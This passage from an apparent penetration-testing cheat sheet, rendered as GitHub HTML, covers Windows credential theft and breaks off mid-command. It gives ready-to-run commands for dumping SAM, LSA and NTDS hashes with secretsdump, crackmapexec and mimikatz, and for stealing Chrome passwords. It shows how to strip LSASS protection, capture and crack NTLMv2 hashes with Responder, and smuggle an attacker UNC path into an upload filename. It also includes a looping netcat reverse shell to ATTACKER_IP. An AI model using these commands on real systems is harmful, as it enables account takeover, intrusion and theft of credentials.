data-snippet-clipboard-copy-content=\"%WINDIR%\\repair\\sam\n%WINDIR%\\repair\\system\n%WINDIR%\\repair\\software\n%WINDIR%\\repair\\security\n\n%WINDIR%\\system32\\config\\default.sav\n%WINDIR%\\system32\\config\\security.sav\n%WINDIR%\\system32\\config\\software.sav\n%WINDIR%\\system32\\config\\system.sav\n\n%SYSTEMROOT%\\ntds\\ntds.dit\n%WINDIR%\\ntds\\ntds.dit\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\repair\\sam\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\repair\\system\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\repair\\software\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\repair\\security\n\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\system32\\config\\\u003cspan class=\"pl-k\"\u003edefault\u003c/span\u003e.sav\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\system32\\config\\security.sav\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\system32\\config\\software.sav\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\system32\\config\\system.sav\n\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eSYSTEMROOT\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\ntds\\ntds.dit\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\ntds\\ntds.dit\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.4.3.2 Dumping Hashes from Windows Domain Controller\u003c/h4\u003e\u003ca id=\"user-content-4432-dumping-hashes-from-windows-domain-controller\" class=\"anchor\" aria-label=\"Permalink: 4.4.3.2 Dumping Hashes from Windows Domain Controller\" href=\"#4432-dumping-hashes-from-windows-domain-controller\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eDCSync Attack (see Active Directory - DCSync section below).\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# requires authentication\nimpacket-secretsdump -just-dc-ntlm -outputfile secretsdump DOMAIN/username:Password@DC_IP_or_FQDN\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e requires authentication\u003c/span\u003e\nimpacket-secretsdump -just-dc-ntlm -outputfile secretsdump DOMAIN/username:Password@DC_IP_or_FQDN\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.4.3.3 Grab NTLMv2 Hashes Using Responder\u003c/h4\u003e\u003ca id=\"user-content-4433-grab-ntlmv2-hashes-using-responder\" class=\"anchor\" aria-label=\"Permalink: 4.4.3.3 Grab NTLMv2 Hashes Using Responder\" href=\"#4433-grab-ntlmv2-hashes-using-responder\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eNote: In addition to SMB, \u003ca href=\"https://github.com/lgandx/Responder\"\u003eResponder\u003c/a\u003e also includes other protocol servers (including HTTP and FTP) as well as poisoning capabilities for Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS), and Multicast DNS (MDNS).\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# start Responder\n# if your victim is Windows XP/Server 2003 or earlier, add '--lm' flag\nsudo responder -I tap0\n# verify it shows:\n# SMB server    [ON]\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e start Responder\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if your victim is Windows XP/Server 2003 or earlier, add '--lm' flag\u003c/span\u003e\nsudo responder -I tap0\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e verify it shows:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e SMB server    [ON]\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eOnce you have Responder's SMB server listening, you can force your victim to authenticate to you in several ways:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eWith remote code execution, run \u003ccode\u003enet use \\\\ATTACKER_IP\\derp\u003c/code\u003e or (PowerShell) \u003ccode\u003els \\\\ATTACKER_IP\\derp\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eWith ability to upload files to victim web server, \u003cstrong\u003eenter a non-existing file with a UNC path\u003c/strong\u003e like \u003ccode\u003e\\\\ATTACKER_IP\\derp\\nonexistent.txt\u003c/code\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eTo do this, capture a normal upload with Burp, then change the \"filename\" field to have a UNC path. \u003cstrong\u003eUse double-backslashes!!\u003c/strong\u003e (i.e. \u003ccode\u003efilename=\"\\\\\\\\192.168.45.192\\\\derp\\\\secrets.txt\"\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eHere's how to do it with curl:\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Malicious file upload to non-existent UNC path, triggering NTLMv2 auth with Responder\n# Change 'myFile' to the file's form-field name.\n# The '@-' tells curl to take the file content from stdin,\n# which is just the 'echo derp' output.\n# Adding the ';filename=' coerces curl to set your custom filename in the form post\n# Remember, you must use double-backslashes to escape them properly!!!\n# '-x' arg passes your curl payload to Burp proxy for inspection\necho derp | curl -s -x \u0026quot;http://127.0.0.1:8080\u0026quot; -F 'myFile=@-;filename=\\\\\\\\ATTACKER_IP\\\\derp\\\\derp.txt' \u0026quot;http://VICTIM_IP/upload\u0026quot; \"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Malicious file upload to non-existent UNC path, triggering NTLMv2 auth with Responder\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Change 'myFile' to the file's form-field name.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e The '@-' tells curl to take the file content from stdin,\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e which is just the 'echo derp' output.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Adding the ';filename=' coerces curl to set your custom filename in the form post\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Remember, you must use double-backslashes to escape them properly!!!\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e '-x' arg passes your curl payload to Burp proxy for inspection\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e derp \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e curl -s -x \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp://127.0.0.1:8080\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -F \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003emyFile=@-;filename=\\\\\\\\ATTACKER_IP\\\\derp\\\\derp.txt\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp://VICTIM_IP/upload\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAfter the victim tries to authenticate to the Responder SMB server, you should see it display the NTLMv2 hash that it captured during the handshake process:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"...\n[+] Listening for events... \n[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211\n[SMB] NTLMv2-SSP Username : FILES01\\paul\n[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E004800550058004300340054004900430004003400570049004E002D00340044004E00480055005800430034005400490043002E00360057004D0052002E004C004F00430041004C0003001400360057004D0052002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000000000000000 \"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e...\n[+] Listening for events... \n[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211\n[SMB] NTLMv2-SSP Username : FILES01\\paul\n[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E004800550058004300340054004900430004003400570049004E002D00340044004E00480055005800430034005400490043002E00360057004D0052002E004C004F00430041004C0003001400360057004D0052002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000000000000000 \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eCopy the hash and save it to a file. Then crack it with hydra/john:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"hashcat -m 5600 responder.hash /usr/share/wordlists/rockyou.txt --force\"\u003e\u003cpre\u003ehashcat -m 5600 responder.hash /usr/share/wordlists/rockyou.txt --force\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.4.3.4 Dump Hashes and Passwords Using Crackmapexec\u003c/h4\u003e\u003ca id=\"user-content-4434-dump-hashes-and-passwords-using-crackmapexec\" class=\"anchor\" aria-label=\"Permalink: 4.4.3.4 Dump Hashes and Passwords Using Crackmapexec\" href=\"#4434-dump-hashes-and-passwords-using-crackmapexec\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eProbably the easiest way to grab all the hashes from a box once you have admin creds or an admin hash:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# dump SAM (using PtH)\ncme smb VICTIM -u Administrator -H NTHASH --local-auth --sam\n\n# dump LSA\ncme smb VICTIM -u Administrator -p PASSWORD --local-auth --lsa\n\n# dump NTDS.dit\ncme smb VICTIM_DC -u DOMAIN_ADMIN -H NTHASH --ntds\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e dump SAM (using PtH)\u003c/span\u003e\ncme smb VICTIM -u Administrator -H NTHASH --local-auth --sam\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e dump LSA\u003c/span\u003e\ncme smb VICTIM -u Administrator -p PASSWORD --local-auth --lsa\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e dump NTDS.dit\u003c/span\u003e\ncme smb VICTIM_DC -u DOMAIN_ADMIN -H NTHASH --ntds\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.4.3.5 Dump Hashes and Passwords Using mimikatz\u003c/h4\u003e\u003ca id=\"user-content-4435-dump-hashes-and-passwords-using-mimikatz\" class=\"anchor\" aria-label=\"Permalink: 4.4.3.5 Dump Hashes and Passwords Using mimikatz\" href=\"#4435-dump-hashes-and-passwords-using-mimikatz\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md\"\u003ePayloadsAllTheThings: Mimikatz\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eTo steal from LSASS, you need to be running as SYSTEM or Administrator with the \u003ccode\u003eSeDebugPrivilege\u003c/code\u003e.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eTo perform Token Elevation (i.e. to get SYSTEM), you require the \u003ccode\u003eSeImpersonatePrivilege\u003c/code\u003e access right.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThe format of mimikatz commands is \u003ccode\u003emodule::command\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\".\\mimikatz.exe\n# start logging session to file\nlog \\\\ATTACKER_IP\\share\\mimikatz.log\n# enable full debug privileges to have access to system memory\nprivilege::debug\n# elevate to system\ntoken::elevate\n# get hashes and try to print plaintext passwords\nsekurlsa::logonpasswords\n# dump hashes from SAM\nlsadump::sam\n# list all available kerberos tickets\nsekurlsa::tickets\n# List Current User's kerberos tickets\nkerberos::list\n# tries to extract plaintext passwords from lsass memory\nsekurlsa::wdigest\n# Get just the krbtgt kerberos tikcket\nsekurlsa::krbtgt\n\n# patch CryptoAPI to make non-exportable PKI keys exportable\ncrypto::capi\n# patch KeyIso to make non-exportable PKI keys exportable\ncrypto::cng\n\n# get google chrome saved credentials\ndpapi::chrome /in:\u0026quot;%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data\u0026quot; /unprotect\ndpapi::chrome /in:\u0026quot;c:\\users\\administrator\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\u0026quot; /unprotect\"\u003e\u003cpre\u003e.\\\u003cspan class=\"pl-c1\"\u003emimikatz.exe\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e start logging session to file\u003c/span\u003e\nlog \\\\ATTACKER_IP\\share\\mimikatz.log\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e enable full debug privileges to have access to system memory\u003c/span\u003e\nprivilege::debug\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e elevate to system\u003c/span\u003e\ntoken::elevate\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get hashes and try to print plaintext passwords\u003c/span\u003e\nsekurlsa::logonpasswords\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e dump hashes from SAM\u003c/span\u003e\nlsadump::sam\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list all available kerberos tickets\u003c/span\u003e\nsekurlsa::tickets\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e List Current User's kerberos tickets\u003c/span\u003e\nkerberos::list\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e tries to extract plaintext passwords from lsass memory\u003c/span\u003e\nsekurlsa::wdigest\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Get just the krbtgt kerberos tikcket\u003c/span\u003e\nsekurlsa::krbtgt\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e patch CryptoAPI to make non-exportable PKI keys exportable\u003c/span\u003e\ncrypto::capi\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e patch KeyIso to make non-exportable PKI keys exportable\u003c/span\u003e\ncrypto::cng\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get google chrome saved credentials\u003c/span\u003e\ndpapi::chrome \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-k\"\u003ein\u003c/span\u003e:\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eunprotect\ndpapi::chrome \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-k\"\u003ein\u003c/span\u003e:\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ec:\\users\\administrator\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eunprotect\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIf \u003cstrong\u003eLSA Protection\u003c/strong\u003e is enabled (default starting with Windows 8.1), this hampers your ability to collect hashes without first bypassing it.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# check if LSA Protection enabled (key set to 1 or 2)\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check if LSA Protection enabled (key set to 1 or 2)\u003c/span\u003e\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev RunAsPPL\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eFirst, make sure \u003ccode\u003emimidriver.sys\u003c/code\u003e is in the current working directory (usually same as \u003ccode\u003emimikatz.exe\u003c/code\u003e).\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eIn mimikatz terminal:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# install the mimidriver.sys on the host\n!+\n\n# remove the protection flags from lsass.exe process\n!processprotect /process:lsass.exe /remove\n\n# Finally run the logonpasswords function to dump lsass\nprivilege::debug    \ntoken::elevate\nsekurlsa::logonpasswords\n\n# re-add protection flags to lsass.exe\n!processprotect /process:lsass.exe\n\n# uninstall mimidriver.sys from system\n!-\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e install the mimidriver.sys on the host\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e!\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e remove the protection flags from lsass.exe process\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e!\u003c/span\u003eprocessprotect \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-k\"\u003eprocess\u003c/span\u003e:\u003cspan class=\"pl-c1\"\u003elsass.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eremove\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Finally run the logonpasswords function to dump lsass\u003c/span\u003e\nprivilege::debug    \ntoken::elevate\nsekurlsa::logonpasswords\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e re-add protection flags to lsass.exe\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e!\u003c/span\u003eprocessprotect \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-k\"\u003eprocess\u003c/span\u003e:\u003cspan class=\"pl-c1\"\u003elsass.exe\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e uninstall mimidriver.sys from system\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e!\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eFor \u003cstrong\u003eCredential Guard\u003c/strong\u003e, you have to disable it from an elevated shell before you can start getting credentials from LSASS. Use \u003ca href=\"https://www.microsoft.com/en-us/download/details.aspx?id=53337\" rel=\"nofollow\"\u003ethis script\u003c/a\u003e to disable it, passing the \u003ccode\u003e-Disable\u003c/code\u003e flag.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.5 Miscellaneous Windows Commands\u003c/h2\u003e\u003ca id=\"user-content-45-miscellaneous-windows-commands\" class=\"anchor\" aria-label=\"Permalink: 4.5 Miscellaneous Windows Commands\" href=\"#45-miscellaneous-windows-commands\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003ecmd.exe:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# restart/reboot the machine now\nshutdown /r /t 0\n\n# infinite loop of reverse shell command every 60 seconds\n# in cmd.exe\nfor /l %n in () do @(\n  @echo Replace with your command here...\n  .\\nc.exe -e cmd ATTACKER_IP 443\n  timeout /t 60 /nobreak \u0026gt; NUL\n)\n\n# same thing, in powershell\nwhile ($true) {start-process -NoNewWindow -file .\\nc.exe -arg \u0026quot;-e\u0026quot;, \u0026quot;cmd\u0026quot;, \u0026quot;192.168.251.220\u0026quot;, \u0026quot;443\u0026quot;; Start-Sleep -Seconds 60;}\n\n# run regedit as SYSTEM (to view protected keys)\npsexec.exe -i -s regedit.exe\n# check out HKLM\\Software\\Microsoft\\Windows NT\\Current Version\\Winlogon\\\n\n# use `runas` to execute commands as another user\n# requires their password. \n# Using `runas` this way requires a GUI session (RDP) to enter password in prompt.\nrunas /user:VICTIM cmd\n\n# recursively list files with Alternate Data Streams\ndir /s /r /a | find \u0026quot;:$DATA\u0026quot;\ngci -recurse | % { gi $_.FullName -stream * } | where {(stream -ne ':$Data') -and (stream -ne 'Zone.Identifier')}\n# print Alternate Data Stream to console\npowershell get-content -path /path/to/stream/file  -stream STREAMNAME\n# hide a file in an Alternate Data Stream\ntype evil.exe 